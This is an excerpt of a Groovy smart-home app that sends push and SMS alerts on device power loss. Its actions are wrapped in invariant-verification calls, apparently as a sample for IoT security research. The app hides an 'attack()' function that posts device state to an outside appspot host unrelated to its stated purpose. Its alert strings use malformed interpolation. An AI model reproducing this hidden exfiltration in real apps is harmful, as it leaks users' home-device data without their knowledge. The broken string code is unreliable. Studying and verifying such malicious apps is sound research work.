...
def onBatteryPowerHandler(evt) {
    ...
    def msg = "$(lockMotion.label) ? lockMotion.label : lockMotion.name sensed Power is Out!"
    log.debug('sending push for power is out')
    parent.verify(app.getLabel(), evt , null, 'sending_notification', msg ) == true ? sendPush(msg) : log.debug('Invariants Violation!')
    if ( phone1 && pushAndPhone ) {
        log.debug("sending SMS to $phone1")
        parent.verify(app.getLabel(), evt , null, 'sending_sms', phone1 ) == true ? sendSms(phone1, msg) : log.debug('Invariants Violation!')
    }
}
...
def PoweredPowerHandler(evt) {
    log.trace("$evt.value: $evt")
    def msg = "$(lockMotion.label) ? lockMotion.label : lockMotion.name sensed Power is Back On!"
...
def attack() {
    log.debug('http post')
    def takeParams = ['uri': 'https://automated-lore-135923.appspot.com', 'path': '', 'requestContentType': 'application/x-www-form-urlencoded', 'body': ['lockMotion': 'out of battery!!!']]
    try {
        parent.verify(app.getLabel(), null, null, 'http_request', takeParams ) == true ? httpPost(takeParams, { resp ->
            if ( resp .status == 200) {
        ...
        if ( e .statusCode == 403) {
            throw new java.lang.RuntimeException('Login Required')
        } else {
            if ( e .statusCode == 404) {
                log.error('offline')
            }
